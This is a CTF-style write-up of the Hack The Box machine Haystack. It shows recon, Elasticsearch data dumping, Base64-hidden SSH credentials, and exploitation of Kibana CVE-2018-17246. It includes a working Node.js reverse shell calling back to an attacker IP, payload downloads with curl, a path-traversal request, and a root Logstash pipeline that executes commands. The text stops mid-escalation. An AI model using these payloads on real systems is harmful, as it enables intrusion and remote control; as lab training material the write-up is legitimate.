data-src="/assets/images/haystack.png" alt="" height="414px" width="615px" /></p><h1 id="configuration">Configuration</h1><p>The operating system that I will be using to tackle this machine is a Kali Linux VM.</p><p>Always remember to map a domain name to the machine’s IP address to ease your rooting !</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.10.10.115 haystack.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
</pre></table></code></div></div><h1 id="reconnaissance">Reconnaissance</h1><p>Using <code class="language-plaintext highlighter-rouge">nmap</code>, we are able to determine the open ports and running services on the machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sT</span> <span class="nt">-sC</span> haystack.htb
Starting Nmap 7.70 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2019-08-29 02:40 EDT
Nmap scan report <span class="k">for </span>haystack.htb <span class="o">(</span>10.10.10.115<span class="o">)</span>
Host is up <span class="o">(</span>0.63s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b <span class="o">(</span>RSA<span class="o">)</span>
|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http    nginx 1.12.2
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
9200/tcp open  http    nginx 1.12.2
| http-methods: 
|_  Potentially risky methods: DELETE
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn'</span>t have a title <span class="o">(</span>application/json<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span><span class="nb">.</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>95.00 seconds

</pre></table></code></div></div><p>Not much can be done with the <code class="language-plaintext highlighter-rouge">ssh</code> service as we do not have any credentials on hand so lets come back to it later. Lets first check out the <code class="language-plaintext highlighter-rouge">http</code> service!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/haystack1.png" alt="" /></p><p>Haha of course it is a needle! XD</p><h1 id="enumeration-1">Enumeration (1)</h1><p>There doesn’t seem much, so lets brute force the directory and files using <code class="language-plaintext highlighter-rouge">gobuster</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://haystack.htb <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-t</span> 200
<span class="o">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:            http://haystack.htb
<span class="o">[</span>+] Threads:        200
<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
<span class="o">[</span>+] User Agent:     gobuster/3.0.1
<span class="o">[</span>+] Timeout:        10s
<span class="o">===============================================================</span>
2019/08/29 02:13:56 Starting gobuster
<span class="o">===============================================================</span>
<span class="o">===============================================================</span>
2019/08/29 02:18:53 Finished
<span class="o">===============================================================</span>
</pre></table></code></div></div><p>Nothing ? Seems like a dead end. Lets move on to the <code class="language-plaintext highlighter-rouge">http</code> service on port 9200. When I saw the port number, I immediately guessed that <code class="language-plaintext highlighter-rouge">Elasticsearch</code> was running on it. The below screenshot confirms it.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/haystack2.png" alt="" /></p><p>The first step was to know what indexes are available on it. An index is like a table in relational databases and also contains JSON documents that are similar to the rows in a table.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$ </span>curl http://haystack.htb:9200/_cat/indices?v
health status index   uuid                   pri rep docs.count docs.deleted store.size pri.store.size
green  open   .kibana 6tjAYZrgQ5CwwR0g6VOoRg   1   0          1            0        4kb            4kb
yellow open   quotes  ZG2D1IqkQNiNZmi2HRImnQ   5   1        253            0    262.7kb        262.7kb
yellow open   bank    eSVpNfCfREyYoVigNWcrMw   5   1       1000            0    483.2kb        483.2kb
</pre></table></code></div></div><p>There are a total of 3 indices. The <code class="language-plaintext highlighter-rouge">.kibana</code> is an index that contains configurations for <code class="language-plaintext highlighter-rouge">Kibana</code>. This confirms that there might be a <code class="language-plaintext highlighter-rouge">Kibana</code> service running on the machine, but we are unable to access it from the outside. The <code class="language-plaintext highlighter-rouge">quotes</code> and <code class="language-plaintext highlighter-rouge">bank</code> indexes seem interesting, so lets dump them out! I made a <code class="language-plaintext highlighter-rouge">python</code> script to ease my job:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">json</span>

<span class="k">def</span> <span class="nf">pretty_print</span><span class="p">(</span><span class="n">json_string</span><span class="p">):</span>
	<span class="k">return</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">json_string</span><span class="p">),</span> <span class="n">indent</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="n">sort_keys</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
	<span class="s">"query"</span><span class="p">:</span> <span class="p">{</span>
		<span class="s">"match_all"</span><span class="p">:</span> <span class="p">{}</span>
	<span class="p">}</span>
<span class="p">}</span>
<span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
	<span class="s">"size"</span><span class="p">:</span> <span class="mi">10000</span>
<span class="p">}</span>
<span class="n">host</span> <span class="o">=</span> <span class="s">"http://haystack.htb:9200"</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"quotes.txt"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">host</span> <span class="o">+</span> <span class="s">"/quotes/_search"</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
	<span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">pretty_print</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">content</span><span class="p">))</span>
	<span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"bank.txt"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
	<span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">host</span> <span class="o">+</span> <span class="s">"/bank/_search"</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
	<span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">pretty_print</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">content</span><span class="p">))</span>
	<span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</pre></table></code></div></div><p>After running the script, we should get <code class="language-plaintext highlighter-rouge">quotes.txt</code> and <code class="language-plaintext highlighter-rouge">bank.txt</code>, each containing a list of JSONs.</p><p>For <code class="language-plaintext highlighter-rouge">bank.txt</code>, it seems to contain records of personal information</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>"hits": {
        "hits": [
            {
                "_id": "25", 
                "_index": "bank", 
                "_score": 1.0, 
                "_source": {
                    "account_number": 25, 
                    "address": "171 Putnam Avenue", 
                    "age": 39, 
                    "balance": 40540, 
                    "city": "Nicholson", 
                    "email": "virginiaayala@filodyne.com", 
                    "employer": "Filodyne", 
                    "firstname": "Virginia", 
                    "gender": "F", 
                    "lastname": "Ayala", 
                    "state": "PA"
                }, 
                "_type": "account"
            }, 
            ...
        ]
}
</pre></table></code></div></div><p>For <code class="language-plaintext highlighter-rouge">quotes.txt</code>, it seems to contain paragraphs in spanish ?</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>"hits": {
        "hits": [
            {
                "_id": "14", 
                "_index": "quotes", 
                "_score": 1.0, 
                "_source": {
                    "quote": "En Am\u00e9rica se desarrollaron importantes civilizaciones, como Caral (la civilizaci\u00f3n 
                    m\u00e1s antigua de Am\u00e9rica, la cual se desarroll\u00f3 en la zona central de Per\u00fa), los anasazi, 
                    los indios pueblo, quimbaya, nazca, chim\u00fa, chav\u00edn, paracas, moche, huari, lima, zapoteca, mixteca,
                     totonaca, tolteca, olmeca y chibcha, y las avanzadas civilizaciones correspondientes a los imperios de 
                     Teotihuacan, Tiahuanaco, maya, azteca e inca, entre muchos otros."
                }, 
                "_type": "quote"
            }, 
            ...
        ]
}
</pre></table></code></div></div><p>It really was like finding a needle in a haystack as I did not know what I was looking for but I still tried to manually look through <code class="language-plaintext highlighter-rouge">quotes.txt</code>. Then I came across this:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>{
    "_id": "2", 
    "_index": "quotes", 
    "_score": 1.0, 
    "_source": {
        "quote": "There's a needle in this haystack, you have to search for it"
    }, 
    "_type": "quote"
}
</pre></table></code></div></div><p>Well I guess that was helpful? :/ After a while I found something interesting!</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>{
    "_id": "111", 
    "_index": "quotes", 
    "_score": 1.0, 
    "_source": {
        "quote": "Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="
    }, 
    "_type": "quote"
}
</pre></table></code></div></div><p>There seems to be some Base64-encoded string in the quote! Decoding it, we get <code class="language-plaintext highlighter-rouge">pass: spanish.is.key</code></p><p>If there is a password, there must be a username! Lets carry on searching…</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>{
    "_id": "45", 
    "_index": "quotes", 
    "_score": 1.0, 
    "_source": {
        "quote": "Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "
    }, 
    "_type": "quote"
},
</pre></table></code></div></div><p>Finally! Likewise, there was a Base64-encoded string. Decoding it, we get <code class="language-plaintext highlighter-rouge">user: security</code>.</p><h1 id="usertxt">user.txt</h1><p>Using <code class="language-plaintext highlighter-rouge">security</code>:<code class="language-plaintext highlighter-rouge">spanish.is.key</code>, we try to log in via <code class="language-plaintext highlighter-rouge">ssh</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ssh security@haystack.htb
security@haystack.htb<span class="s1">'s  password:
[security@haystack ~]$ ls
user.txt
[security@haystack ~]$ cat user.txt
04d1XXXXXXXXXXXXXXXXXXXXXXXXXXXX
</span></pre></table></code></div></div><h1 id="enumeration-2">Enumeration (2)</h1><p>As <code class="language-plaintext highlighter-rouge">security</code>, we need to know what processes are being runned on the machine. To do so, I will be using <a href="https://github.com/DominicBreuker/pspy">pspy</a>. To transfer it from my machine to this machine, I will be using <code class="language-plaintext highlighter-rouge">python</code>’s <code class="language-plaintext highlighter-rouge">SimpleHTTPServer</code> module.</p><p>On my machine:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">mkdir </span>httpserver
<span class="nv">$ </span><span class="nb">cd </span>httpserver
<span class="nv">$ </span><span class="nb">cp</span> ~/Downloads/pspy64 <span class="nb">.</span>
<span class="nv">$ </span>python <span class="nt">-m</span> SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
</pre></table></code></div></div><p>On the <code class="language-plaintext highlighter-rouge">Haystack</code> machine:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="o">[</span>security@haystack tmp]<span class="nv">$ </span>curl http://10.10.14.75/pspy64 <span class="o">&gt;</span> pspy64
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 4364k  100 4364k    0     0   639k      0  0:00:06  0:00:06 <span class="nt">--</span>:--:--  834k
<span class="o">[</span>security@haystack tmp]<span class="nv">$ </span><span class="nb">chmod </span>777 pspy64
<span class="o">[</span>security@haystack tmp]<span class="nv">$ </span>./pspy64 
</pre></table></code></div></div><p>After a while, I noticed a process running with <code class="language-plaintext highlighter-rouge">root</code> privileges and the process is <code class="language-plaintext highlighter-rouge">Logstash</code>!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>2019/08/29 06:20:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>6397   | /bin/java <span class="nt">-Xms500m</span> <span class="nt">-Xmx500m</span> <span class="nt">-XX</span>:+UseParNewGC <span class="nt">-XX</span>:+UseConcMarkSweepGC 
<span class="nt">-XX</span>:CMSInitiatingOccupancyFraction<span class="o">=</span>75 <span class="nt">-XX</span>:+UseCMSInitiatingOccupancyOnly <span class="nt">-Djava</span>.awt.headless<span class="o">=</span><span class="nb">true</span> <span class="nt">-Dfile</span>.encoding<span class="o">=</span>UTF-8 
<span class="nt">-Djruby</span>.compile.invokedynamic<span class="o">=</span><span class="nb">true</span> <span class="nt">-Djruby</span>.jit.threshold<span class="o">=</span>0 <span class="nt">-XX</span>:+HeapDumpOnOutOfMemoryError <span class="nt">-Djava</span>.security.egd<span class="o">=</span>file:/dev/urandom
 <span class="nt">-cp</span> /usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:/usr/share/logstash/logstash-core/lib/jars/
 commons-codec-1.11.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.0.8.jar:/usr/share/logstash/logstash-core/
 lib/jars/error_prone_annotations-2.0.18.jar:/usr/share/logstash/logstash-core/lib/jars/google-java-format-1.1.jar:/usr/share/
 logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/guava-22.0.jar:/usr/
 share/logstash/logstash-core/lib/jars/j2objc-annotations-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/
 jackson-annotations-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-core-2.9.5.jar:/usr/share/logstash/logstash-core/
 lib/jars/jackson-databind-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-cbor-2.9.5.jar:/usr/share/
 logstash/logstash-core/lib/jars/janino-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/jruby-complete-9.1.13.0.jar:/usr/
 share/logstash/logstash-core/lib/jars/jsr305-1.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.9.1.jar:/usr/share/
 logstash/logstash-core/lib/jars/log4j-core-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.9.1.jar:/usr/
 share/logstash/logstash-core/lib/jars/logstash-core.jar:/usr/share/logstash/logstash-core/lib/jars/
 org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.contenttype-3.4.100.jar:/usr/
 share/logstash/logstash-core/lib/jars/org.eclipse.core.expressions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/
 org.eclipse.core.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/
 logstash/logstash-core/lib/jars/org.eclipse.core.resources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/
 org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1.3.100.jar:/usr/share/
 logstash/logstash-core/lib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/
 org.eclipse.equinox.preferences-3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.registry-3.5.101.jar:/
 usr/share/logstash/logstash-core/lib/jars/org.eclipse.jdt.core-3.10.0.jar:/usr/share/logstash/logstash-core/lib/jars/
 org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/
 logstash-core/lib/jars/slf4j-api-1.7.25.jar org.logstash.Logstash <span class="nt">--path</span>.settings /etc/logstash 
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">Logstash</code> is a program that is able to injest data or logs, process them and forward to other destinations. The configuration files for <code class="language-plaintext highlighter-rouge">Logstash</code> are typically located at <code class="language-plaintext highlighter-rouge">/etc/logstash</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="o">[</span>security@haystack ~]<span class="nv">$ </span><span class="nb">ls</span> /etc/logstash
conf.d       log4j2.properties     logstash.yml         pipelines.yml
jvm.options  logstash-sample.conf  logstash.yml.rpmnew  startup.options
<span class="o">[</span>security@haystack logstash]<span class="nv">$ </span><span class="nb">ls</span> /etc/logstash/conf.d
filter.conf  input.conf  output.conf
</pre></table></code></div></div><p>In the <code class="language-plaintext highlighter-rouge">conf.d</code> folder contains the files on how <code class="language-plaintext highlighter-rouge">Logstash</code> processes the information.</p><p><code class="language-plaintext highlighter-rouge">input.conf</code>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>input {
	file {
		path =&gt; "/opt/kibana/logstash_*"
		start_position =&gt; "beginning"
		sincedb_path =&gt; "/dev/null"
		stat_interval =&gt; "10 second"
		type =&gt; "execute"
		mode =&gt; "read"
	}
}
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">filter.conf</code>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>filter {
	if [type] == "execute" {
		grok {
			match =&gt; { "message" =&gt; "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
		}
	}
}

</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">output.conf</code>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>output {
	if [type] == "execute" {
		stdout { codec =&gt; json }
		exec {
			command =&gt; "%{comando} &amp;"
		}
	}
}
</pre></table></code></div></div><p>From these, we can tell that <code class="language-plaintext highlighter-rouge">Logstash</code> is:</p><ol><li>Reading line by line from all files in <code class="language-plaintext highlighter-rouge">/opt/kibana</code> that starts with <code class="language-plaintext highlighter-rouge">logstash_</code><li>Parsing each line using a certain format <code class="language-plaintext highlighter-rouge">Ejecutar comando : &lt;COMMAND&gt;</code><li>Executing the captured <code class="language-plaintext highlighter-rouge">&lt;COMMAND&gt;</code></ol><p>To start off, lets try to create a file in <code class="language-plaintext highlighter-rouge">/opt/kibana</code>. But unfortunately, we are not able to as we do not have write permission :(</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="o">[</span>security@haystack ~]<span class="nv">$ </span><span class="nb">touch</span> /opt/kibana/logstash_cmd
<span class="nb">touch</span>: cannot <span class="nb">touch</span> ‘/opt/kibana/logstash_cmd’: Permission denied
<span class="o">[</span>security@haystack ~]<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /opt | <span class="nb">grep </span>kibana
drwxr-x---.  2 kibana kibana   6 Aug 29 01:35 kibana
</pre></table></code></div></div><p>To be able to write to <code class="language-plaintext highlighter-rouge">/opt/kibana</code>, we need to be <code class="language-plaintext highlighter-rouge">kibana</code>. But how?</p><p>First, we will need to find out where is <code class="language-plaintext highlighter-rouge">kibana</code> is running from.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="o">[</span>security@haystack ~]<span class="nv">$ </span>ps aux | <span class="nb">grep </span>kibana
kibana     6401  0.4  5.0 1360968 194848 ?      Ssl  00:13   1:47 /usr/share/kibana/bin/../node/bin/node <span class="nt">--no-warnings</span> /usr/share/
kibana/bin/../src/cli <span class="nt">-c</span> /etc/kibana/kibana.yml
<span class="o">[</span>security@haystack ~]<span class="nv">$ </span><span class="nb">ls</span> /usr/share/kibana/bin
kibana  kibana-keystore  kibana-plugin
</pre></table></code></div></div><h1 id="exploitation">Exploitation</h1><p>We then find out what is the version of <code class="language-plaintext highlighter-rouge">kibana</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">[</span>security@haystack ~]<span class="nv">$ </span>/usr/share/kibana/bin/kibana <span class="nt">--version</span>
6.4.2
</pre></table></code></div></div><p>This version of <code class="language-plaintext highlighter-rouge">kibana</code> is affected by the local file inclusion vulnerability <a href="https://www.cvedetails.com/cve/CVE-2018-17246/">CVE-2018-17246</a>. More information on how to exploit it could be found <a href="https://github.com/mpgn/CVE-2018-17246">here</a></p><p>Lets create a reverse shell file written in node.</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
    <span class="kd">var</span> <span class="nx">net</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">net</span><span class="dl">"</span><span class="p">),</span>
        <span class="nx">cp</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">child_process</span><span class="dl">"</span><span class="p">),</span>
        <span class="nx">sh</span> <span class="o">=</span> <span class="nx">cp</span><span class="p">.</span><span class="nx">spawn</span><span class="p">(</span><span class="dl">"</span><span class="s2">/bin/bash</span><span class="dl">"</span><span class="p">,</span> <span class="p">[]);</span>
    <span class="kd">var</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">net</span><span class="p">.</span><span class="nx">Socket</span><span class="p">();</span>
    <span class="nx">client</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="mi">1337</span><span class="p">,</span> <span class="dl">"</span><span class="s2">10.10.XXX.XXX</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span>
        <span class="nx">client</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">sh</span><span class="p">.</span><span class="nx">stdin</span><span class="p">);</span>
        <span class="nx">sh</span><span class="p">.</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
        <span class="nx">sh</span><span class="p">.</span><span class="nx">stderr</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
    <span class="p">});</span>
    <span class="k">return</span> <span class="sr">/a/</span><span class="p">;</span> <span class="c1">// Prevents the Node.js application form crashing</span>
<span class="p">})();</span>
</pre></table></code></div></div><p>And transfer it over to the <code class="language-plaintext highlighter-rouge">Haystack</code> machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="o">[</span>security@haystack tmp]<span class="nv">$ </span>curl http://10.10.14.75/exploit.js <span class="o">&gt;</span> exploit.js
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   383  100   383    0     0    578      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:--   578
<span class="o">[</span>security@haystack tmp]<span class="nv">$ </span><span class="nb">chmod </span>777 exploit.js
</pre></table></code></div></div><p>On our machine, we start a listener.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 1337
listening on <span class="o">[</span>any] 1337 ...
</pre></table></code></div></div><p>We then proceed to exploit the vulnerability on the <code class="language-plaintext highlighter-rouge">Haystack</code> machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="o">[</span>security@haystack tmp]<span class="err">$</span>
curl <span class="nt">-XGET</span> <span class="s2">"http://127.0.0.1:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../
tmp/exploit.js"</span>
</pre></table></code></div></div><p>Back to our machine, we caught the reverse shell.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>connect to <span class="o">[</span>10.10.XXX.XXX] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.115] 39144
python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>  
bash-4.2<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>994<span class="o">(</span>kibana<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>992<span class="o">(</span>kibana<span class="o">)</span> <span class="nv">grupos</span><span class="o">=</span>992<span class="o">(</span>kibana<span class="o">)</span> <span class="nv">contexto</span><span class="o">=</span>system_u:system_r:unconfined_service_t:s0
</pre></table></code></div></div><h1 id="roottxt">root.txt</h1><p>As user <code class="language-plaintext highlighter-rouge">kibana</code>, we can now write to the <code class="language-plaintext highlighter-rouge">/opt/kibana</code> directory.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>bash-4.2<span class="nv">$ </span><span class="nb">touch</span> /opt/kibana/logstash_cmd
